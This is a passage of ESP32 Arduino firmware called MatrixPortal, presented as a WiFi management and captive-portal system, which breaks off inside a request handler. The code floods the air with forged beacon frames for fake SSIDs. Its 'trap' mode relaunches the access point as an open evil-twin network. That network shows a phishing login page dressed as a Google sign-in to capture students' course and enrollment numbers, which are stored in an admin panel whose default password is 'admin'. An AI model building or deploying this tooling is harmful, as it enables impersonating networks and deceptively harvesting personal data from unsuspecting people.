/*
 * MatrixPortal — Sistema de Gerenciamento WiFi + Captive Portal
 * Compatível com Arduino ESP32 Core 3.x
 *
 * Arquitetura:
 *  - Uma única softAP ("MatrixPortal" por padrão) hospeda:
 *      · Painel admin em /admin (HTTP Basic Auth)
 *      · Página de captura em /login
 *  - Lista de até 255 redes customizadas (SSID + canal), enviadas como beacons
 *  - Uma rede pode ser definida como "Armadilha" — nesse caso a AP real
 *    assume o SSID dela e captura credenciais (Curso + Matrícula)
 *  - CRUD completo de redes e alunos, persistência em LittleFS + NVS
 *  - Endpoints de status (heap, uptime, pacotes) e scan de redes reais
 */

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <LittleFS.h>
#include <Preferences.h>
#include <vector>
#include <time.h>
#include <sys/time.h>

// ==================== CONSTANTES ====================
const char* DEFAULT_ADMIN_SSID = "MatrixPortal";
const char* ADMIN_USER = "admin";
const byte DNS_PORT = 53;
const int MAX_NETWORKS = 255;

// ==================== OBJETOS GLOBAIS ====================
WebServer server(80);
DNSServer dnsServer;
Preferences prefs;

// ==================== ESTADO ====================
String adminPassword = "admin";
uint32_t beaconInterval = 200;         // ms
bool spamming = false;
String activeTrapSSID = "";            // "" = modo MatrixPortal; != "" = modo captura

struct CustomNetwork {
    int id;
    String ssid;
    uint8_t channel;
    bool enabled;
    uint8_t mac[6];
};
std::vector<CustomNetwork> networks;
int nextNetworkId = 1;

struct Student {
    int id;
    String curso;
    String matricula;
    String timestamp;
};
std::vector<Student> students;
int nextStudentId = 1;

std::vector<IPAddress> authenticated;
const size_t MAX_AUTH = 40;

unsigned long lastBeaconTime = 0;
uint32_t packetCounter = 0;

// ==================== PACOTE BEACON (109 bytes) ====================
uint8_t beaconPacket[109] = {
    0x80, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x00, 0x00,
    0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
    0xe8, 0x03,
    0x31, 0x00,
    0x00, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x01, 0x08,
    0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
    0x03, 0x01,
    0x01,
    0x30, 0x18,
    0x01, 0x00,
    0x00, 0x0f, 0xac, 0x02,
    0x02, 0x00,
    0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
    0x01, 0x00,
    0x00, 0x0f, 0xac, 0x02,
    0x00, 0x00
};

// ==================== HTML: LOGIN DO ALUNO ====================
const char LOGIN_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Fazer login - Conta Google</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0;}
  body{font-family:'Roboto',Arial,sans-serif;background:#fff;color:#202124;
       min-height:100vh;display:flex;flex-direction:column;justify-content:space-between;padding:20px;}
  .main{flex:1;display:flex;justify-content:center;align-items:center;padding:20px 0;}
  .card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;
        width:450px;max-width:100%;background:#fff;}
  .logo{display:flex;justify-content:center;margin-bottom:16px;}
  h1{font-size:24px;font-weight:400;text-align:center;color:#202124;margin-bottom:8px;}
  .subtitle{text-align:center;font-size:16px;color:#202124;margin-bottom:32px;}
  .input-group{position:relative;margin-bottom:24px;}
  .input-group input{width:100%;padding:13px 15px;border:1px solid #dadce0;
                     border-radius:4px;font-size:16px;color:#202124;background:transparent;
                     outline:none;transition:border-color .2s;}
  .input-group input:focus{border-color:#1a73e8;border-width:2px;padding:12px 14px;}
  .input-group label{position:absolute;left:14px;top:50%;transform:translateY(-50%);
                     background:#fff;padding:0 4px;color:#5f6368;font-size:16px;
                     pointer-events:none;transition:all .2s;}
  .input-group input:focus+label,
  .input-group input:not(:placeholder-shown)+label{
    top:0;font-size:12px;color:#1a73e8;}
  .input-group input:not(:focus):not(:placeholder-shown)+label{color:#5f6368;}
  .info-text{font-size:14px;color:#5f6368;margin-top:24px;line-height:1.5;}
  .actions{display:flex;justify-content:flex-end;align-items:center;margin-top:24px;}
  .next-btn{background:#1a73e8;color:#fff;border:none;border-radius:4px;
            padding:0 24px;height:36px;font-size:14px;font-weight:500;cursor:pointer;}
  .next-btn:hover{background:#1b66c9;}
  .next-btn:disabled{background:#dadce0;cursor:not-allowed;}
  footer{display:flex;justify-content:space-between;padding:10px 20px;
         font-size:12px;color:#5f6368;flex-wrap:wrap;gap:10px;}
  .success{text-align:center;padding:20px 0;}
  .success .check{width:60px;height:60px;border-radius:50%;background:#1a73e8;color:#fff;
                  display:flex;align-items:center;justify-content:center;
                  font-size:32px;margin:0 auto 20px;}
  .success h2{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px;}
  .success p{color:#5f6368;font-size:14px;}
  @media(max-width:500px){.card{padding:32px 24px 24px;border:none;}body{padding:0;}}
</style>
</head>
<body>
<div class="main">
  <div class="card" id="card">
    <div class="logo">
      <svg width="74" height="24" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
        <path fill="#4285F4" d="M12.24 10.285V14.4h6.806c-.275 1.765-2.056 5.174-6.806 5.174-4.095 0-7.433-3.389-7.433-7.574s3.337-7.574 7.433-7.574c2.33 0 3.891.989 4.785 1.849l3.254-3.138C18.463 0.417 14.954-0.995 10.99-0.995 6.44-.995 3.72 2.15 3.72 7.43s4.31 8.426 9.89 8.426c5.73 0 9.52-4.02 9.52-9.74 0-.65-.07-1.15-.16-1.66h-10.73z"/>
        <path fill="#34A853" d="M32.94 16.78c-1.87 0-3.42-.87-4.1-2.47l1.93-.8c.44 1.05 1.4 1.62 2.56 1.62 1.46 0 2.36-.87 2.36-2.02v-.69c-.7.82-1.65 1.27-2.92 1.27-2.31 0-4.23-1.8-4.23-4.1 0-2.3 1.92-4.1 4.23-4.1 1.27 0 2.22.45 2.92 1.27V6.37h2.03v7.88c0 3.26-2.15 4.77-4.78 4.77zm.04-9.47c-1.39 0-2.36 1.07-2.36 2.47 0 1.4.97 2.47 2.36 2.47 1.39 0 2.36-1.07 2.36-2.47 0-1.4-.97-2.47-2.36-2.47z"/>
        <path fill="#FBBC05" d="M51.15 16.78c-3.07 0-5.56-2.33-5.56-5.43 0-3.1 2.49-5.43 5.56-5.43 3.07 0 5.56 2.33 5.56 5.43 0 3.1-2.49 5.43-5.56 5.43zm0-9.19c-2.15 0-3.56 1.67-3.56 3.76 0 2.09 1.41 3.76 3.56 3.76 2.15 0 3.56-1.67 3.56-3.76 0-2.09-1.41-3.76-3.56-3.76z"/>
        <path fill="#EA4335" d="M63.5 16.78c-3.07 0-5.56-2.33-5.56-5.43 0-3.1 2.49-5.43 5.56-5.43 3.07 0 5.56 2.33 5.56 5.43 0 3.1-2.49 5.43-5.56 5.43zm0-9.19c-2.15 0-3.56 1.67-3.56 3.76 0 2.09 1.41 3.76 3.56 3.76 2.15 0 3.56-1.67 3.56-3.76 0-2.09-1.41-3.76-3.56-3.76z"/>
      </svg>
    </div>
    <h1>Fazer login</h1>
    <p class="subtitle">Use sua conta institucional</p>
    <form id="form">
      <div class="input-group">
        <input type="text" id="curso" required maxlength="50" placeholder=" " autocomplete="off">
        <label for="curso">Curso</label>
      </div>
      <div class="input-group">
        <input type="text" id="matricula" required maxlength="30" placeholder=" " autocomplete="off">
        <label for="matricula">Matrícula</label>
      </div>
      <div class="info-text">
        Seus dados são usados apenas para registro de presença na rede.
      </div>
      <div class="actions">
        <button type="submit" class="next-btn" id="btn">Avançar</button>
      </div>
    </form>
  </div>
</div>
<footer>
  <div>Português (Brasil)</div>
  <div>Ajuda · Privacidade · Termos</div>
</footer>
<script>
document.getElementById('form').addEventListener('submit', async (e) => {
  e.preventDefault();
  const btn = document.getElementById('btn');
  btn.disabled = true; btn.textContent = 'Entrando...';
  const curso = document.getElementById('curso').value.trim();
  const matricula = document.getElementById('matricula').value.trim();
  try {
    const r = await fetch('/api/login', {
      method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'curso='+encodeURIComponent(curso)+'&matricula='+encodeURIComponent(matricula)
    });
    const d = await r.json();
    if (d.status === 'ok') {
      document.getElementById('card').innerHTML =
        '<div class="success"><div class="check">✓</div>' +
        '<h2>Conectado com sucesso</h2>' +
        '<p>Bem-vindo(a) à rede. Aproveite o acesso.</p></div>';
    } else {
      alert('Erro: ' + d.message);
      btn.disabled = false; btn.textContent = 'Avançar';
    }
  } catch(err) {
    alert('Falha de conexão. Tente novamente.');
    btn.disabled = false; btn.textContent = 'Avançar';
  }
});
</script>
</body>
</html>
)rawliteral";

// ==================== HTML: JÁ AUTENTICADO ====================
const char SUCCESS_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Conectado</title>
<style>
body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;
     min-height:100vh;background:#f0f5ff;margin:0;padding:20px;}
.card{background:#fff;padding:45px 35px;border-radius:14px;text-align:center;
      box-shadow:0 10px 40px rgba(0,0,0,.1);max-width:400px;}
h1{color:#28a745;font-size:52px;margin:0;}
h2{color:#333;margin:10px 0 5px;}
p{color:#888;font-size:14px;margin-top:20px;}
</style></head><body><div class="card">
<h1>✓</h1><h2>Conectado</h2>
<p>Você já está autenticado nesta rede.</p>
</div></body></html>
)rawliteral";

// ==================== HTML: PAINEL ADMIN ====================
const char ADMIN_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MatrixPortal — Admin</title>
<style>
*{box-sizing:border-box;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
     background:#eef2f7;margin:0;padding:20px;color:#2c3e50;}
.container{max-width:1100px;margin:0 auto;}
h1{color:#1a1a2e;margin:0 0 18px;font-size:22px;}
.panel{background:#fff;border-radius:12px;padding:22px;margin-bottom:18px;
       box-shadow:0 2px 10px rgba(0,0,0,.06);}
.panel h2{margin:0 0 15px;color:#4a69bd;font-size:16px;
          border-bottom:2px solid #eef2f7;padding-bottom:8px;}
label{display:block;margin-top:12px;font-weight:600;font-size:13px;color:#555;}
input,select{padding:9px 11px;margin-top:5px;border:1.5px solid #dde3ea;
             border-radius:6px;font-size:14px;width:100%;max-width:280px;
             font-family:inherit;background:#fff;}
input:focus,select:focus{outline:none;border-color:#4a69bd;}
button{padding:8px 14px;margin:6px 4px 0 0;border:none;border-radius:6px;
       font-weight:600;cursor:pointer;font-size:13px;transition:opacity .15s;font-family:inherit;}
button:hover{opacity:.85;}
.btn-primary{background:#4a69bd;color:#fff;}
.btn-success{background:#28a745;color:#fff;}
.btn-danger{background:#dc3545;color:#fff;}
.btn-warning{background:#f39c12;color:#fff;}
.btn-secondary{background:#6c757d;color:#fff;}
.row{display:flex;flex-wrap:wrap;gap:12px;align-items:flex-end;}
.row > div{flex:1;min-width:160px;}
table{width:100%;border-collapse:collapse;margin-top:12px;}
th,td{padding:10px;text-align:left;border-bottom:1px solid #eef2f7;font-size:13px;vertical-align:middle;}
th{background:#f8fafd;font-weight:700;color:#4a69bd;}
tr:hover td{background:#fafbfc;}
.edit-input{padding:5px 7px;border:1.5px solid #dde3ea;border-radius:5px;
            font-size:13px;width:100%;max-width:180px;font-family:inherit;}
.stats{display:flex;flex-wrap:wrap;gap:12px;}
.stat{background:#f8fafd;padding:12px 16px;border-radius:8px;
      min-width:120px;border-left:3px solid #4a69bd;}
.stat .lbl{font-size:11px;color:#888;text-transform:uppercase;letter-spacing:.5px;}
.stat .val{font-size:19px;font-weight:700;color:#1a1a2e;margin-top:3px;}
.badge{display:inline-block;padding:3px 9px;border-radius:12px;
       font-size:11px;font-weight:700;}
.badge.on{background:#d4edda;color:#155724;}
.badge.off{background:#f8d7da;color:#721c24;}
.badge.trap{background:#fff3cd;color:#856404;}
.empty{text-align:center;color:#999;padding:20px;font-style:italic;font-size:13px;}
#scanInfo{margin-top:10px;font-size:12px;color:#666;line-height:1.7;}
.notice{background:#fff3cd;border-left:3px solid #f39c12;padding:10px 14px;
        margin-bottom:12px;font-size:13px;color:#856404;border-radius:5px;}
.channel-pill{display:inline-block;padding:2px 8px;background:#e3f2fd;
              color:#1565c0;border-radius:10px;font-weight:700;font-size:11px;}
@media(max-width:700px){th,td{padding:6px;font-size:11px;}
  .edit-input{max-width:90px;}button{padding:6px 9px;font-size:11px;}}
</style>
</head>
<body>
<div class="container">
  <h1>📡 MatrixPortal — Painel de Controle</h1>

  <div class="panel">
    <h2>📊 Status do Sistema</h2>
    <div class="stats">
      <div class="stat"><div class="lbl">Heap Livre</div><div class="val" id="stHeap">-</div></div>
      <div class="stat"><div class="lbl">Uptime</div><div class="val" id="stUp">-</div></div>
      <div class="stat"><div class="lbl">Pacotes</div><div class="val" id="stPk">-</div></div>
      <div class="stat"><div class="lbl">Redes</div><div class="val" id="stNets">-</div></div>
      <div class="stat"><div class="lbl">Alunos</div><div class="val" id="stStu">-</div></div>
      <div class="stat"><div class="lbl">Spam</div><div class="val"><span id="stState" class="badge off">PARADO</span></div></div>
      <div class="stat"><div class="lbl">SSID Atual</div><div class="val" id="stSSID" style="font-size:13px;">-</div></div>
    </div>
  </div>

  <div class="panel">
    <h2>🎛️ Controle</h2>
    <button class="btn-success" onclick="iniciar()">▶ Iniciar Spam</button>
    <button class="btn-danger" onclick="parar()">⏹ Parar</button>
    <button class="btn-secondary" onclick="escanear()">🔍 Escanear Redes</button>
    <div id="scanInfo"></div>
  </div>

  <div class="panel">
    <h2>🔧 Configurações</h2>
    <div class="row">
      <div>
        <label>Intervalo de Beacons (ms):</label>
        <input type="number" id="cfgInterval" min="50" max="5000" step="50">
      </div>
      <div>
        <label>Senha do Admin:</label>
        <input type="text" id="cfgPass" maxlength="40" placeholder="Deixe vazio para desativar">
      </div>
      <div><button class="btn-primary" onclick="salvarConfig()">💾 Salvar</button></div>
    </div>
    <div class="notice">⚠ Alterar a senha exige recarregar o painel com as novas credenciais.</div>
  </div>

  <div class="panel">
    <h2>📶 Redes Geradas (Beacons)</h2>
    <div class="row">
      <div><label>Nome (SSID):</label><input type="text" id="newNetSSID" maxlength="32" placeholder="Ex: WiFi_Gratis"></div>
      <div><label>Canal:</label>
        <select id="newNetCh">
          <option>1</option><option>2</option><option>3</option><option>4</option>
          <option>5</option><option>6</option><option>7</option><option>8</option>
          <option>9</option><option>10</option><option>11</option><option>12</option>
          <option>13</option>
        </select>
      </div>
      <div><button class="btn-success" onclick="addNet()">+ Adicionar</button></div>
    </div>
    <div class="notice" id="trapInfo" style="display:none;"></div>
    <div id="tabelaNets"><div class="empty">Carregando...</div></div>
  </div>

  <div class="panel">
    <h2>👥 Alunos Registrados</h2>
    <div class="row">
      <div><label>Curso:</label><input type="text" id="newCurso" maxlength="50"></div>
      <div><label>Matrícula:</label><input type="text" id="newMatricula" maxlength="30"></div>
      <div><button class="btn-success" onclick="addStu()">+ Adicionar</button></div>
    </div>
    <div id="tabelaStu"><div class="empty">Carregando...</div></div>
  </div>
</div>

<script>
function esc(s){return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
function fmtUp(s){const d=Math.floor(s/86400);s%=86400;const h=Math.floor(s/3600);s%=3600;const m=Math.floor(s/60);s%=60;return (d?d+'d ':'')+String(h).padStart(2,'0')+':'+String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');}

let activeTrapSSID = "";

async function carregar(){
  try{
    const [st,nets,sts] = await Promise.all([
      fetch('/api/status').then(r=>r.json()),
      fetch('/api/networks').then(r=>r.json()),
      fetch('/api/students').then(r=>r.json())
    ]);
    document.getElementById('stHeap').textContent = (st.heap/1024).toFixed(1)+' KB';
    document.getElementById('stUp').textContent = fmtUp(st.uptime);
    document.getElementById('stPk').textContent = st.packets;
    document.getElementById('stNets').textContent = nets.length;
    document.getElementById('stStu').textContent = sts.length;
    const el = document.getElementById('stState');
    el.textContent = st.spamming?'ATIVO':'PARADO';
    el.className = 'badge '+(st.spamming?'on':'off');
    document.getElementById('stSSID').textContent = st.ssid;
    activeTrapSSID = st.trap;
    document.getElementById('cfgInterval').value = st.interval;
    renderNets(nets);
    renderStu(sts);
  }catch(e){console.error(e);}
}

function renderNets(list){
  if(list.length===0){
    document.getElementById('tabelaNets').innerHTML='<div class="empty">Nenhuma rede criada ainda. Adicione acima.</div>';
    document.getElementById('trapInfo').style.display='none';
    return;
  }
  let h='<table><thead><tr><th>ID</th><th>SSID</th><th>Canal</th><th>Ativa</th><th>Armadilha</th><th>Ações</th></tr></thead><tbody>';
  for(const n of list){
    const isTrap = (activeTrapSSID === n.ssid);
    h+=`<tr>
      <td>${n.id}</td>
      <td><input class="edit-input" id="ssid-${n.id}" value="${esc(n.ssid)}" maxlength="32"></td>
      <td><span class="channel-pill">CH ${n.ch}</span></td>
      <td>
        <button class="${n.en?'btn-success':'btn-secondary'}" onclick="toggleNet(${n.id},${!n.en})" style="padding:4px 8px;font-size:11px;">
          ${n.en?'✓ ON':'✗ OFF'}
        </button>
      </td>
      <td>${isTrap?'<span class="badge trap">ATIVA</span>':'<button class="btn-warning" onclick="setTrap(${n.id})" style="padding:4px 8px;font-size:11px;">Tornar Trap</button>'}</td>
      <td>
        <button class="btn-primary" onclick="saveNet(${n.id})">💾</button>
        <button class="btn-danger" onclick="delNet(${n.id})">🗑</button>
      </td></tr>`;
  }
  document.getElementById('tabelaNets').innerHTML = h+'</tbody></table>';
  
  const t = document.getElementById('trapInfo');
  if(activeTrapSSID){
    t.style.display='block';
    t.innerHTML='⚠️ <b>Modo Captura Ativo:</b> a AP real está transmitindo como <b>"'+esc(activeTrapSSID)+'"</b> (aberta). Alunos que conectarem verão a página de login. Você precisa estar conectado a essa rede para continuar no painel. <button class="btn-secondary" onclick="clearTrap()" style="padding:3px 8px;font-size:11px;margin-left:10px;">Desativar Captura</button>';
  } else {
    t.style.display='none';
  }
}

function renderStu(list){
  if(list.length===0){
    document.getElementById('tabelaStu').innerHTML='<div class="empty">Nenhum aluno registrado ainda.</div>';
    return;
  }
  let h='<table><thead><tr><th>ID</th><th>Curso</th><th>Matrícula</th><th>Registrado em</th><th>Ações</th></tr></thead><tbody>';
  for(const s of list){
    h+=`<tr>
      <td>${s.id}</td>
      <td><input class="edit-input" id="cur-${s.id}" value="${esc(s.curso)}" maxlength="50"></td>
      <td><input class="edit-input" id="mat-${s.id}" value="${esc(s.matricula)}" maxlength="30"></td>
      <td>${esc(s.timestamp)}</td>
      <td>
        <button class="btn-primary" onclick="saveStu(${s.id})">💾 Salvar</button>
        <button class="btn-danger" onclick="delStu(${s.id})">🗑 Excluir</button>
      </td></tr>`;
  }
  document.getElementById('tabelaStu').innerHTML = h+'</tbody></table>';
}

// === Redes ===
async function addNet(){
  const ssid=document.getElementById('newNetSSID').value.trim();
  const ch=document.getElementById('newNetCh').value;
  if(!ssid) return alert('Digite o nome da rede.');
  const r=await fetch('/api/networks',{method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:`ssid=${encodeURIComponent(ssid)}&channel=${ch}`});
  const d=await r.json();
  if(d.status==='ok'){
    document.getElementById('newNetSSID').value='';
    carregar();
  } else alert('Erro: '+d.message);
}
async function saveNet(id){
  const ssid=document.getElementById('ssid-'+id).value.trim();
  if(!ssid) return alert('SSID vazio.');
  const r=await fetch('/api/networks',{method:'PUT',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:`id=${id}&ssid=${encodeURIComponent(ssid)}`});
  const d=await r.json();
  if(d.status!=='ok') alert('Erro: '+d.message);
  carregar();
}
async function delNet(id){
  if(!confirm('Excluir rede #'+id+'?')) return;
  await fetch('/api/networks?id='+id,{method:'DELETE'});
  carregar();
}
async function toggleNet(id,en){
  const r=await fetch('/api/networks/toggle',{method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:`id=${id}&enabled=${en?1:0}`});
  const d=await r.json();
  if(d.status!=='ok') alert('Erro: '+d.message);
  carregar();
}
async function setTrap(id){
  if(!confirm('Ativar modo captura nesta rede?\n\nA AP real será reiniciada com o SSID desta rede (aberta). Você será desconectado e precisará reconectar a esse novo SSID para acessar o painel.')) return;
  const r=await fetch('/api/networks/trap',{method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:`id=${id}`});
  const d=await r.json();
  if(d.status==='ok'){
    alert('SSID alterado para: '+d.ssid+'\n\nReconecte-se a esta rede e volte em http://192.168.4.1/admin');
  } else alert('Erro: '+d.message);
}
async function clearTrap(){
  const r=await fetch('/api/networks/trap',{method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'clear=1'});
  const d=await r.json();
  if(d.status==='ok') alert('Modo MatrixPortal restaurado. Reconecte-se à rede "'+d.ssid+'"');
  else alert('Erro: '+d.message);
}

// === Alunos ===
async function addStu(){
  const c=document.getElementById('newCurso').value.trim();
  const m=document.getElementById('newMatricula').value.trim();
  if(!c||!m) return alert('Preencha curso e matrícula.');
  const r=await fetch('/api/students',{method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:`curso=${encodeURIComponent(c)}&matricula=${encodeURIComponent(m)}`});
  const d=await r.json();
  if(d.status==='ok'){
    document.getElementById('newCurso').value='';
    document.getElementById('newMatricula').value='';
    carregar();
  } else alert('Erro: '+d.message);
}
async function saveStu(id){
  const c=document.getElementById('cur-'+id).value.trim();
  const m=document.getElementById('mat-'+id).value.trim();
  if(!c||!m) return alert('Preencha todos os campos.');
  const r=await fetch('/api/students',{method:'PUT',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:`id=${id}&curso=${encodeURIComponent(c)}&matricula=${encodeURIComponent(m)}`});
  const d=await r.json();
  if(d.status==='ok') carregar();
  else alert('Erro: '+d.message);
}
async function delStu(id){
  if(!confirm('Excluir aluno #'+id+'?')) return;
  await fetch('/api/students?id='+id,{method:'DELETE'});
  carregar();
}

// === Controle ===
async function iniciar(){await fetch('/api/start',{method:'POST'});carregar();}
async function parar(){await fetch('/api/stop',{method:'POST'});carregar();}
async function escanear(){
  document.getElementById('scanInfo').textContent='Escaneando...';
  const r=await fetch('/api/scan');
  const d=await r.json();
  document.getElementById('scanInfo').innerHTML = d.length
    ? 'Detectadas: '+d.map(n=>esc(n.ssid)+' ('+n.rssi+' dBm)').join(' · ')
    : 'Nenhuma rede detectada.';
}
async function salvarConfig(){
  const i=document.getElementById('cfgInterval').value;
  const p=document.getElementById('cfgPass').value;
  const r=await fetch('/api/config',{method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:`interval=${i}`+(p?'&password='+encodeURIComponent(p):'')});
  const d=await r.json();
  alert(d.status==='ok'?'Configuração salva!':'Erro: '+d.message);
  document.getElementById('cfgPass').value='';
}

carregar();
setInterval(carregar, 3000);
</script>
</body>
</html>
)rawliteral";

// ==================== UTILITÁRIOS ====================
String sanitize(const String& s) {
    String out = s;
    out.replace("|", "");
    out.replace("\n", " ");
    out.replace("\r", " ");
    out.replace("\"", "'");
    return out;
}

String jsonEscape(const String& s) {
    String out;
    for (size_t i = 0; i < s.length(); i++) {
        char c = s[i];
        if (c == '"' || c == '\\') { out += '\\'; out += c; }
        else if (c == '\n') out += "\\n";
        else if (c == '\r') out += "\\r";
        else if ((unsigned char)c >= 0x20) out += c;
    }
    return out;
}

String getTimestamp() {
    time_t now = time(NULL);
    struct tm ti;
    localtime_r(&now, &ti);
    char buf[32];
    strftime(buf, sizeof(buf), "%d/%m/%Y %H:%M:%S", &ti);
    return String(buf);
}

void initSystemTime() {
    struct tm tmv = {};
    if (strptime(__DATE__ " " __TIME__, "%b %d %Y %H:%M:%S", &tmv) != NULL) {
        tmv.tm_isdst = -1;
        time_t t = mktime(&tmv);
        if (t > 0) {
            struct timeval tv = { .tv_sec = t, .tv_usec = 0 };
            settimeofday(&tv, NULL);
        }
    }
}

bool isAuthenticated(IPAddress ip) {
    for (auto& a : authenticated) if (a == ip) return true;
    return false;
}

void addAuthenticated(IPAddress ip) {
    if (isAuthenticated(ip)) return;
    if (authenticated.size() >= MAX_AUTH) authenticated.erase(authenticated.begin());
    authenticated.push_back(ip);
}

// ==================== REDES: PERSISTÊNCIA ====================
void saveNetworks() {
    File f = LittleFS.open("/networks.txt", "w");
    if (!f) return;
    for (const auto& n : networks) {
        f.printf("%d|%s|%d|%d\n", n.id, n.ssid.c_str(), n.channel, n.enabled ? 1 : 0);
    }
    f.close();
    prefs.begin("cfg", false);
    prefs.putInt("nextNetId", nextNetworkId);
    prefs.end();
}

void loadNetworks() {
    prefs.begin("cfg", true);
    nextNetworkId = prefs.getInt("nextNetId", 1);
    prefs.end();
    networks.clear();
    if (!LittleFS.exists("/networks.txt")) return;
    File f = LittleFS.open("/networks.txt", "r");
    if (!f) return;
    while (f.available()) {
        String line = f.readStringUntil('\n');
        line.trim();
        if (line.length() == 0) continue;
        int p1 = line.indexOf('|');
        int p2 = line.indexOf('|', p1 + 1);
        int p3 = line.indexOf('|', p2 + 1);
        if (p1 > 0 && p2 > p1 && p3 > p2) {
            CustomNetwork n;
            n.id = line.substring(0, p1).toInt();
            n.ssid = line.substring(p1 + 1, p2);
            n.channel = line.substring(p2 + 1, p3).toInt();
            n.enabled = line.substring(p3 + 1).toInt() != 0;
            // MAC estável baseado no ID
            n.mac[0] = 0x02;
            n.mac[1] = (n.id >> 8) & 0xFF;
            n.mac[2] = n.id & 0xFF;
            n.mac[3] = (n.id * 7) & 0xFF;
            n.mac[4] = (n.id * 13) & 0xFF;
            n.mac[5] = (n.id * 17) & 0xFF;
            networks.push_back(n);
        }
    }
    f.close();
}

// ==================== ALUNOS: PERSISTÊNCIA ====================
void saveStudents() {
    File f = LittleFS.open("/students.txt", "w");
    if (!f) return;
    for (const auto& s : students) {
        f.printf("%d|%s|%s|%s\n", s.id, s.curso.c_str(), s.matricula.c_str(), s.timestamp.c_str());
    }
    f.close();
    prefs.begin("cfg", false);
    prefs.putInt("nextStuId", nextStudentId);
    prefs.end();
}

void loadStudents() {
    prefs.begin("cfg", true);
    nextStudentId = prefs.getInt("nextStuId", 1);
    prefs.end();
    students.clear();
    if (!LittleFS.exists("/students.txt")) return;
    File f = LittleFS.open("/students.txt", "r");
    if (!f) return;
    while (f.available()) {
        String line = f.readStringUntil('\n');
        line.trim();
        if (line.length() == 0) continue;
        int p1 = line.indexOf('|');
        int p2 = line.indexOf('|', p1 + 1);
        int p3 = line.indexOf('|', p2 + 1);
        if (p1 > 0 && p2 > p1 && p3 > p2) {
            Student s;
            s.id = line.substring(0, p1).toInt();
            s.curso = line.substring(p1 + 1, p2);
            s.matricula = line.substring(p2 + 1, p3);
            s.timestamp = line.substring(p3 + 1);
            students.push_back(s);
        }
    }
    f.close();
}

// ==================== CONFIG: PERSISTÊNCIA ====================
void loadConfig() {
    prefs.begin("cfg", true);
    adminPassword = prefs.getString("adminPass", "admin");
    beaconInterval = prefs.getInt("beaconMs", 200);
    activeTrapSSID = prefs.getString("trapSSID", "");
    spamming = prefs.getBool("spamming", false);
    prefs.end();
}

void saveConfig() {
    prefs.begin("cfg", false);
    prefs.putString("adminPass", adminPassword);
    prefs.putInt("beaconMs", beaconInterval);
    prefs.putString("trapSSID", activeTrapSSID);
    prefs.putBool("spamming", spamming);
    prefs.end();
}

// ==================== BEACON ====================
void sendBeacon(const CustomNetwork &net) {
    memcpy(&beaconPacket[10], net.mac, 6);
    memcpy(&beaconPacket[16], net.mac, 6);
    uint8_t len = net.ssid.length();
    if (len > 32) len = 32;
    memset(&beaconPacket[38], 0x20, 32);
    memcpy(&beaconPacket[38], net.ssid.c_str(), len);
    beaconPacket[37] = len;
    beaconPacket[82] = net.channel;
    if (esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), false) == ESP_OK) {
        packetCounter++;
    }
}

void sendAllBeacons() {
    for (uint8_t ch = 1; ch <= 13; ch++) {
        bool has = false;
        for (const auto& n : networks) {
            if (n.enabled && n.channel == ch) { has = true; break; }
        }
        if (!has) continue;
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        for (const auto& n : networks) {
            if (n.enabled && n.channel == ch) {
                sendBeacon(n);
                delay(2);
            }
        }
    }
}

// ==================== RESTART AP ====================
void restartAPWithSSID(const String& ssid, uint8_t channel) {
    Serial.printf("Reiniciando AP: SSID='%s' CH=%d\n", ssid.c_str(), channel);
    WiFi.softAPdisconnect(true);
    delay(200);
    WiFi.softAP(ssid.c_str(), NULL, channel);   // Aberto
    delay(100);
    Serial.printf("AP IP: %s\n", WiFi.softAPIP().toString().c_str());
}

// ==================== HANDLERS: AUTENTICAÇÃO ADMIN ====================
bool checkAdmin() {
    if (adminPassword.length() == 0) return true;
    if (server.authenticate(ADMIN_USER, adminPassword.c_str())) return true;
    server.requestAuthentication(BASIC_AUTH, "MatrixPortal Admin");
    return false;
}

// ==================== HANDLERS: PÁGINAS ====================
void handleRoot() {
    if (isAuthenticated(server.client().remoteIP())) {
